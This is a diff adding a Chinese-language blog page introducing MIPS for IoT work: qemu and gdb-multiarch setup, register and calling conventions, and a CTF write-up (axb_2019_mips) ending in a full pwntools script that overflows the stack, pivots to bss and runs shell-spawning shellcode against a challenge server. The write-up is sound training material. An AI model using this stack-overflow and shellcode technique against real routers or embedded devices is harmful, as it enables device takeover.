@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>iot入门--mips基础 | heart22&#39;s blog</title>
+  
+  <!-- Favicon 配置 -->
+  
+    
+      <link rel="icon" type="image/x-icon" href="../../../../favicon.ico">
+    
+    
+      <link rel="icon" type="image/png" sizes="16x16" href="../../../../favicon-16x16.png">
+    
+    
+      <link rel="icon" type="image/png" sizes="32x32" href="../../../../favicon-32x32.png">
+    
+    
+      <link rel="icon" type="image/png" sizes="192x192" href="../../../../favicon-192x192.png">
+    
+    
+      <link rel="apple-touch-icon" sizes="180x180" href="../../../../apple-touch-icon.png">
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="../../../../css/theme-colors.css">
+  <link rel="stylesheet" href="../../../../css/main.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <!-- 添加代码高亮样式 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+  <!-- 添加highlight.js库 -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <!-- 添加mermaid.js库 -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+  <link rel="stylesheet" href="../../../../css/code.css">
+  <link rel="stylesheet" href="../../../../css/code-custom.css">
+  <link rel="stylesheet" href="../../../../css/code-languages.css">
+  <link rel="stylesheet" href="../../../../css/mermaid.css">
+
+  <link rel="stylesheet" href="../../../../css/vs-code.css">
+  <link rel="stylesheet" href="../../../../css/post.css">
+  <link rel="stylesheet" href="../../../../css/tag.css">
+  <link rel="stylesheet" href="../../../../css/categories.css">
+  <link rel="stylesheet" href="../../../../css/archive.css">
+  <link rel="stylesheet" href="../../../../css/search.css">
+  <link rel="stylesheet" href="../../../../css/mobile.css">  <link rel="stylesheet" href="../../../../css/responsive.css">
+  <link rel="stylesheet" href="../../../../css/elements.css">
+
+  <!-- 添加 JetBrains Mono 字体 -->  
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+  <!-- Add any custom head content here -->
+
+  <script src="../../../../js/explorer.js"></script>
+  <script src="../../../../js/code-copy.js"></script>
+  <script src="../../../../js/code-enhance.js"></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    <div class="wrapper">
+      <div class="mobile-menu-toggle">
+        <i class="fas fa-bars"></i>
+      </div>
+      <header class="vs-header">
+  <nav class="vs-nav">
+    <div class="nav-left">
+      <a href="/" class="nav-brand">
+        <i class="fas fa-terminal"></i>
+        heart22&#39;s blog
+      </a>
+    </div>
+    
+    <div class="nav-right">
+      <a href="/" class="nav-item ">
+        <i class="fas fa-home"></i>
+        <span>Home</span>
+      </a>
+      <a href="/archives/" class="nav-item ">
+        <i class="fas fa-archive"></i>
+        <span>Archives</span>
+      </a>
+      <a href="/categories/" class="nav-item ">
+        <i class="fas fa-folder"></i>
+        <span>Categories</span>
+      </a>
+      <a href="/tags/" class="nav-item ">
+        <i class="fas fa-tags"></i>
+        <span>Tags</span>
+      </a>
+      <a href="/search/" class="nav-item ">
+        <i class="fas fa-search"></i>
+        <span>Search</span>
+      </a>
+      <a href="/about/" class="nav-item ">
+        <i class="fas fa-info-circle"></i>
+        <span>About</span>
+      </a>
+    </div>
+  </nav>
+</header>
+
+<script>
+  function smoothScroll(event, target) {
+    event.preventDefault();
+    const targetId = target.substring(target.indexOf('#') + 1);
+    const targetElement = document.getElementById(targetId);
+
+    if (targetElement) {
+      window.scrollTo({
+        top: targetElement.offsetTop - 50, // 调整偏移量
+        behavior: 'smooth'
+      });
+    } else {
+      window.location.href = target;
+    }
+  }
+
+  window.addEventListener('scroll', function() {
+    const header = document.querySelector('.vs-header');
+    const nav = document.querySelector('.vs-nav');
+    const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+    
+    nav.style.setProperty('--scroll-percent', `${scrollPercent}%`);
+    
+    if (window.scrollY > 0) {
+      header.classList.add('scrolled');
+    } else {
+      header.classList.remove('scrolled');
+    }
+  });
+
+  // 添加标签页切换动画
+  document.querySelectorAll('.nav-item').forEach(item => {
+    item.addEventListener('click', function(e) {
+      const ripple = document.createElement('span');
+      ripple.classList.add('nav-ripple');
+      this.appendChild(ripple);
+      
+      const rect = this.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+      
+      ripple.style.left = `${x}px`;
+      ripple.style.top = `${y}px`;
+      
+      setTimeout(() => ripple.remove(), 1000);
+    });
+  });
+</script>
+
+
+<div class="vscode-container">
+  <!-- 左侧资源管理器 -->
+  <div class="sidebar-explorer">
+    <!-- TOC导航 -->
+    <div class="explorer-section">
+      <div class="section-header">
+        <i class="fas fa-list"></i>
+        <span>TABLE OF CONTENTS</span>
+      </div>
+      <div class="section-content">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%92%8C%E8%B0%83%E8%AF%95"><span class="toc-text">运行和调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">qemu 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mips%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-text">mips相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-text">指令集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-text">函数调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">栈溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li></ol>
+      </div>
+    </div>
+    
+    <!-- 同分类文章 -->
+    
+    <div class="explorer-section">
+      <div class="section-header">
+        <i class="fas fa-folder"></i>
+        <span>CATEGORY POSTS</span>
+      </div>
+      <div class="section-content">
+        
+      </div>
+    </div>
+    
+    
+    <!-- 标签列表 -->
+    
+    <div class="explorer-section">
+      <div class="section-header">
+        <i class="fas fa-tags"></i>
+        <span>ARTICLE TAGS</span>
+      </div>
+      <div class="section-content">
+        
+          <div class="tag-item">
+            <i class="fas fa-tag"></i>
+            <a href="../../../../tags/mips/">mips</a>
+            <span class="count">(1)</span>
+          </div>
+        
+      </div>
+    </div>
+    
+  </div>
+
+  <!-- 主要内容区域 -->
+  <div class="editor-content">
+    <div class="tab-bar">
+      <div class="tab active">
+        <i class="fas fa-file-alt"></i>
+        <span>iot入门--mips基础.md</span>
+      </div>
+    </div>
+    
+    <div class="content-area">
+      <article class="post-content">
+        <div class="post-header">
+          <h1>iot入门--mips基础</h1>
+          <div class="post-meta">
+            <span class="date">
+              <i class="fas fa-calendar-alt"></i>
+              2025-10-16
+            </span>            
+              <span class="categories">
+                <i class="fas fa-folder"></i>
+                <div class="categories-list">
+                  <ul class="category-item-post-list"><li class="category-item-post-list-item"><a class="category-item-post-list-link" href="../../../../categories/iot/">iot</a></li></ul>
+                </div>
+              </span>
+            
+            
+              <span class="tags">
+                <i class="fas fa-tags"></i>
+                <div class="tags-list">
+                  <ul class="tag-item-post-list" itemprop="keywords"><li class="tag-item-post-list-item"><a class="tag-item-post-list-link" href="../../../../tags/mips/" rel="tag">mips</a></li></ul>
+                </div>
+              </span>
+            
+          </div>
+        </div>
+        
+        <div class="post-body vscode-markdown">
+          <p>编译<code>MIPS</code>环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install gcc-mips-linux-gnu<br></code></pre></td></tr></table></figure>
+
+<h2 id="运行和调试"><a href="#运行和调试" class="headerlink" title="运行和调试"></a>运行和调试</h2><h3 id="qemu-环境搭建"><a href="#qemu-环境搭建" class="headerlink" title="qemu 环境搭建"></a>qemu 环境搭建</h3><p>qemu两种模式 qemu-user和qemu-user-static</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install qemu qemu-user qemu-user-static<br></code></pre></td></tr></table></figure>
+
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>小端序：<code>qemu-mipsel ./xxx</code><br>大端序：<code>qemu-mips ./xxx</code></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>多架构调试工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gdb-multiarch<br></code></pre></td></tr></table></figure>
+
+<p>终端运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mips -g 1234 ./demo<br></code></pre></td></tr></table></figure>
+
+<p>再开另一个终端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb-multiarch  <br>set architecture mips  <br>set endian big  <br>target remote localhost:1234<br></code></pre></td></tr></table></figure>
+
+<h2 id="mips相关知识"><a href="#mips相关知识" class="headerlink" title="mips相关知识"></a>mips相关知识</h2><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>路由器是一种嵌入式系统，多采用 MIPS 和 ARM 这两种指令架构</p>
+<p>MIPS 指令架构属于 RISC (精简指令集) 体系，是一种普遍应用于<strong>小型设备</strong>的处理器架构，使用 MIPS 指令架构的 Linux 系统便被称为 MIPS Linux，MIPS 架构广泛应用于嵌入式系统领域</p>
+<blockquote>
+<p>RISC 架构的一些典型指令集包括 MIPS, ARM, RISC-V</p>
+</blockquote>
+<p>在路由器中，常用的一种 MIPS 架构就是 MIPS32</p>
+<p>在 MIPS 体系结构中有 32 个通用寄存器 <strong>REGISTER</strong>，其中主要的寄存器如下</p>
+<table>
+<thead>
+<tr>
+<th>REGISTER</th>
+<th>NAME</th>
+<th>USAGE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>zero</td>
+<td>存储常量 0</td>
+</tr>
+<tr>
+<td>$2-$3</td>
+<td>v0−v1</td>
+<td>存放函数调用的返回值或表达式</td>
+</tr>
+<tr>
+<td>$4-$7</td>
+<td>a0−a3</td>
+<td>作为函数调用的前四个参数 (arguments)</td>
+</tr>
+<tr>
+<td>$8-$15</td>
+<td>t0−t7</td>
+<td>供汇编程序使用的临时寄存器 临时变量</td>
+</tr>
+<tr>
+<td>$16-$23</td>
+<td>s0−s7</td>
+<td>调用子函数时 用于保存原寄存器的值</td>
+</tr>
+<tr>
+<td>$24-$25</td>
+<td>t8−t9</td>
+<td>供汇编程序使用的临时寄存器 补充_t_0−t7</td>
+</tr>
+<tr>
+<td>$26-$27</td>
+<td>k0−k1</td>
+<td>中断&#x2F;异常处理程序使用 保存系统参数</td>
+</tr>
+<tr>
+<td>$28</td>
+<td>$gp</td>
+<td>全局指针 (Global Pointer)</td>
+</tr>
+<tr>
+<td>$29</td>
+<td>$sp</td>
+<td>堆栈指针 指向栈顶 (Stack Pointer)</td>
+</tr>
+<tr>
+<td>$31</td>
+<td>$ra</td>
+<td>返回地址 (return address)</td>
+</tr>
+</tbody></table>
+<p>然后还有 3 个特殊的寄存器，分别是 PC (程序计数器)、HI (乘除结果高位寄存器)、LO (乘除结果低位寄存器)</p>
+<p>MIPS32 架构的寻址模式有<strong>寄存器寻址、立即数寻址、寄存器相对寻址和 PC 相对寻址</strong></p>
+<p><strong>在 MIPS 指令集中，需要重点关注的是：</strong></p>
+<ul>
+<li><strong>l 开头的 LOAD 加载指令和 s 开头的 STORE 存储指令</strong>，用于从存储器中读取数据到寄存器，或者将寄存器中的数据保存在存储器中</li>
+<li><strong>move 指令</strong>用于寄存器之间的值传递</li>
+<li><strong>算术运算指令</strong>的操作数只能是寄存器，例如 <code>add, sub, mult, div</code>… 它们与 AMD 架构下的算术运算指令比较大的区别是操作数的使用和数量，MIPS 架构的算数运算结果都会存在另外一个寄存器中，而不是去覆盖某一个原本存储某个操作数的寄存器</li>
+<li><strong>slt 指令</strong>类似于 cmp</li>
+<li><strong>syscall 的系统调用号</strong>存放在 $v0 中</li>
+<li><strong>分支跳转指令</strong>由 b 开头，如 <code>b target</code>; <code>beq $t0, $t1, target</code> 等</li>
+<li><strong>常见的跳转指令</strong>有 <code>j target</code>; <code>jr $t3</code>; <code>jal target</code></li>
+</ul>
+<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588113/2025/10/9db4c211943520811a21bde13b16b408.png"></p>
+<p>传参：<br>函数调用时传参：如果函数的参数小于等于四个，那么会使用 <code>$a0 ~ $a3</code> 寄存器来存放参数。如果参数多于四个，那么多于的参数则存放到栈里</p>
+<p>调用：</p>
+<p>MIPS32 架构下的函数有两种类型——叶子函数和非叶子函数。如果一个函数中不会再调用其他任何函数，那么这个函数就是一个叶子函数，其余的函数都是非叶子函数</p>
+<p>函数 <code>A</code> 调用函数 <code>B</code>。如果 <code>B</code> 是叶子函数，那么在调用 <code>B</code> 函数时，会将 <code>B</code> 函数的返回地址存入 <code>$ra</code> 寄存器；如果 <code>B</code> 是非叶子函数（<code>B</code> 函数内部调用了一个 <code>C</code> 函数），那么在跳转到 <code>B</code> 函数时，会将其返回地址先存入 <code>$ra</code> 寄存器中，随后在 <code>B</code> 函数内部再将 <code>$ra</code> 寄存器的值存入栈中（位于 <code>fp-0x4</code> 的位置，如下图）。当 <code>B</code> 函数调用 <code>C</code> 函数时，会将其返回地址存入 <code>$ra</code> 寄存器，在返回时执行 <code>jr $ra</code> 指令回到 <code>B</code> 函数。现在假设 <code>B</code> 函数已经执行完毕准备返回到 <code>A</code> 函数，会将原先存入栈里的返回地址读到 <code>$ra</code> 寄存器中，最后执行 <code>jr $ra</code> 指令，回到 <code>A</code> 函数</p>
+<p>demo如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>	<span class="hljs-type">int</span> value=a+b;<br>	<span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">int</span> c=sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value ==&gt; %d\n&quot;</span>,c);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>传参<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588630/2025/10/378ca78be9a431aee719757db4d87d97.png"></p>
+<p>叶子函数</p>
+<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588115/2025/10/fbb1e7597d86b4c0241256e1f25118d7.png"></p>
+<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588632/2025/10/f33aca29586f338fe056c8a283bced69.png"></p>
+<p>非叶子函数</p>
+<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588117/2025/10/a5f411765816037e339a95d27466a816.png"></p>
+<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588667/2025/10/db4d05dd4e3342ca33e0ceecea72f972.png"></p>
+<p>sp + 0x20保存着旧fp地址<br>sp + 0x24保存着返回地址</p>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>对于非叶子函数的话，返回地址保存在栈中，通过栈溢出进行劫持返回地址即可。<br>对于叶子函数，利用就比较局限。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>axb_2019_mips</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s_[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [sp+18h] [+18h] BYREF</span><br><br>  alarm(<span class="hljs-number">0x3Cu</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(s_, <span class="hljs-number">0</span>, <span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to MIPS pwn!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, s_, <span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello!, %s&quot;</span>, s_);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf_[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [sp+18h] [+18h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf_, <span class="hljs-number">0x200u</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>vuln中有栈溢出，因为mips中是没有nx的，通过栈迁移来执行shellcode</p>
+<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588120/2025/10/cb372d4a5c86ce8a8b048cd0cb4f8a6e.png"></p>
+<p>从这里可以看出，read的第二个参数a1是由fp控制的。同时又有栈溢出</p>
+<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1760588123/2025/10/eae29eb4fb80c5d1f541778156268fb6.png"></p>
+<p>只要我们控制fp，再返回时通过 <code>lw      $fp, 0x38+var_s0($sp)</code> 就能够实现任意地址写。同时劫持ra进行第二次读入</p>
+<p>因为我们控制了fp为bss段地址 <code>move    $sp, $fp</code> 通过这一条指令即可栈迁移到bss段上。</p>
+<p>因为第二次读入时都是通过sp偏移来进行寻址的，我们只需要再bss段中设置好地址就能够劫持ra</p>
+<p>读入时从sp + 0x18开始读入，通过栈溢出，将sp + 0x38设置返回地址，在sp + 0x40处布置好shellcode就能够执行shellcode来getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">```<span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#cli_script() </span><br><br><span class="hljs-comment">#io = process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;/&#x27;)</span><br>io =remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">25318</span>)<br><span class="hljs-comment">#context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">i</span>):<br>    gdb.attach(i)<br>    pause()<br><br>io.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name: &quot;</span>)<br>io.send(<span class="hljs-string">b&quot;aaaa&quot;</span>)<br><br>shellcode = asm(shellcraft.sh(),arch=<span class="hljs-string">&#x27;mips&#x27;</span>)<br>bss_addr = elf.bss() + <span class="hljs-number">0x10</span><br><br><br>payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,<br>    bss_addr,<br>    <span class="hljs-number">0x4007E4</span><br>)<br>io.send(payload)<br><br>payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>,<br>    bss_addr+<span class="hljs-number">0x40</span>,<br>    shellcode<br>)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+        </div>
+        
+        <!-- 文章导航 - 只在同分类有多篇文章时显示 -->
+        
+        
+        
+        
+        <!-- 推荐文章 -->
+        
+
+
+<div class="vs-recommended-posts">
+  <div class="vs-recommended-header">
+    <div class="section-header">
+      <i class="fas fa-lightbulb"></i>
+      <span>RELATED POSTS</span>
+    </div>
+  </div>
+  
+  <div class="vs-recommended-grid">
+    
+      <div class="vs-recommended-item" data-index="0" tabindex="0">
+        <a href="../../../08/05/%E9%AB%98%E7%89%88%E6%9C%AClargebin-attack/" class="vs-recommended-link">
+          <!-- 文章信息 -->
+          <div class="vs-recommended-content">
+            <div class="vs-recommended-title">
+              <i class="fas fa-file-code"></i>
+              <span>高版本largebin_attack</span>
+            </div>
+            
+            <div class="vs-recommended-excerpt">
+              利用源码123456789101112131415161718192021 /* maintain large bins in sorted order */ if (fwd != bck) # 检查large bin是否为空 &amp;#123;...
+            </div>
+            
+            <div class="vs-recommended-meta">
+              
+              
+              
+                <span class="vs-tags-preview">
+                  <i class="fas fa-tags"></i>
+                  heap
+                  
+                </span>
+              
+              
+              <span class="vs-meta-info">
+                <span class="vs-date">
+                  <i class="fas fa-calendar-alt"></i>
+                  Aug 05
+                </span>
+                <span class="vs-reading-time">
+                  <i class="fas fa-clock"></i>
+                  1 min
+                </span>
+              </span>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      <div class="vs-recommended-item" data-index="1" tabindex="0">
+        <a href="../../../05/12/ret2dl/" class="vs-recommended-link">
+          <!-- 文章信息 -->
+          <div class="vs-recommended-content">
+            <div class="vs-recommended-title">
+              <i class="fas fa-file-code"></i>
+              <span>ret2dl</span>
+            </div>
+            
+            <div class="vs-recommended-excerpt">
+              延迟绑定运作流程 dl_runtime_resolve运作流程理解_dl_runtime_resolve的流程需要了解几个段 1、dynamic段.dynamic段中保存了动态链接器需要的信息，Dynamic Symbol Table（动态...
+            </div>
+            
+            <div class="vs-recommended-meta">
+              
+              
+              
+                <span class="vs-tags-preview">
+                  <i class="fas fa-tags"></i>
+                  stack
+                  
+                </span>
+              
+              
+              <span class="vs-meta-info">
+                <span class="vs-date">
+                  <i class="fas fa-calendar-alt"></i>
+                  May 12
+                </span>
+                <span class="vs-reading-time">
+                  <i class="fas fa-clock"></i>
+                  7 min
+                </span>
+              </span>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      <div class="vs-recommended-item" data-index="2" tabindex="0">
+        <a href="../../../04/29/%E5%89%8D%E8%A8%80/" class="vs-recommended-link">
+          <!-- 文章信息 -->
+          <div class="vs-recommended-content">
+            <div class="vs-recommended-title">
+              <i class="fas fa-file-code"></i>
+              <span>前言</span>
+            </div>
+            
+            <div class="vs-recommended-excerpt">
+              ​ 重新折腾了一下blog，之前也折腾过一个，但是一段时间就没有管了。写blog主要是想记录自己的生活和学习总结。也是对自己的一个督促。希望有一天自己能够成为独当一面的存在
+            </div>
+            
+            <div class="vs-recommended-meta">
+              
+              
+              
+              
+              <span class="vs-meta-info">
+                <span class="vs-date">
+                  <i class="fas fa-calendar-alt"></i>
+                  Apr 29
+                </span>
+                <span class="vs-reading-time">
+                  <i class="fas fa-clock"></i>
+                  1 min
+                </span>
+              </span>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+  </div>
+  
+  <!-- 查看更多 -->
+  <div class="vs-recommended-footer">
+    <a href="../../../../archives/" class="vs-view-more">
+      <i class="fas fa-folder-open"></i>
+      <span>View More Posts</span>
+      <i class="fas fa-chevron-right"></i>
+    </a>
+  </div>
+</div>
+
+<script>
+// 键盘导航支持
+document.addEventListener('DOMContentLoaded', function() {
+  const items = document.querySelectorAll('.vs-recommended-item');
+  let currentIndex = -1;
+  
+  // 键盘事件
+  document.addEventListener('keydown', function(e) {
+    if (!items.length) return;
+    
+    if (e.key === 'Tab') {
+      // Tab键导航由浏览器处理
+      return;
+    }
+    
+    if (e.key === 'ArrowRight' || e.key === 'ArrowLeft') {
+      e.preventDefault();
+      
+      // 移除当前高亮
+      if (currentIndex >= 0) {
+        items[currentIndex].classList.remove('vs-focused');
+      }
+      
+      // 更新索引
+      if (e.key === 'ArrowRight') {
+        currentIndex = (currentIndex + 1) % items.length;
+      } else {
+        currentIndex = currentIndex <= 0 ? items.length - 1 : currentIndex - 1;
+      }
+      
+      // 添加新高亮
+      items[currentIndex].classList.add('vs-focused');
+      items[currentIndex].focus();
+    }
+    
+    if (e.key === 'Enter' && currentIndex >= 0) {
+      const link = items[currentIndex].querySelector('a');
+      if (link) link.click();
+    }
+  });
+  
+  // 鼠标悬停时更新当前索引
+  items.forEach((item, index) => {
+    item.addEventListener('mouseenter', function() {
+      currentIndex = index;
+      items.forEach(i => i.classList.remove('vs-focused'));
+      item.classList.add('vs-focused');
+    });
+  });
+});
+</script>
+
+        
+        <!-- 评论区 -->
+        
+  <div class="vs-comments-section">
+    <div class="section-header">
+      <i class="fas fa-comments"></i>
+      <span>COMMENTS</span>
+    </div>
+    
+    
+      <!-- Waline 评论系统 -->
+      <div id="waline"></div>
+      <script>
+        // 加载 Waline CSS
+        const walineCSS = document.createElement('link');
+        walineCSS.rel = 'stylesheet';
+        walineCSS.href = 'https://unpkg.com/@waline/client@v3/dist/waline.css';
+        document.head.appendChild(walineCSS);
+        
+        // 加载 Waline JS
+        const walineScript = document.createElement('script');
+        walineScript.type = 'module';
+        walineScript.onload = function() {
+          // 确保 Waline 加载后再初始化
+          import('https://unpkg.com/@waline/client@v3/dist/waline.js').then(({ init }) => {
+            const waline = init({
+              el: '#waline',
+              serverURL: 'vsc4tblackcat1337.vercel.app',
+              lang: 'zh-CN',
+              locale: {},
